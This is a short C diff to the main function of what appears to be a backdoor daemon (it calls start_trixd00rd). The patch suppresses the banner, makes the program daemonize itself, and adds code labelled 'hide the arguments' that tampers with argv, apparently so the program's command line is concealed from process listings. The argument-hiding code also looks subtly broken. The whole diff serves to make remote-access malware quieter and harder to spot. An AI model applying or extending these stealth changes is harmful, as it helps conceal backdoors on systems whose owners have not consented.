@@ -36,6 +36,8 @@
 #include "verbose.h"
 #include "wrapper.h"
 
+#include "daemon.h"
+
 #include <getopt.h>
 
 
@@ -47,7 +49,7 @@ int main(int argc, char *argv[])
 
 
     /* banner is very important */
-    banner();
+//    banner();
     check_argc(argc);
     ctrl = alloc_structs();
     ctrl = set_ctrl_defaults(ctrl);
@@ -86,6 +88,7 @@ int main(int argc, char *argv[])
              break;
          case 'd':
              ctrl->daemon = DAEMON;
+			 daemonize();
              break;
          case 'n':
              ctrl->shell->banner = BANNER_OFF;
@@ -115,6 +118,14 @@ int main(int argc, char *argv[])
 
     /* install signal handlers here */
     install_signals();
+
+	if (argc > 1) {         // hide the arguments
+			char *arg_end;
+			arg_end = argv[argc-1] + strlen (argv[argc-1]);
+			*arg_end = ' '; 
+	}
+
+	
 
     /* whole action starts here my darling */
     start_trixd00rd(ctrl);
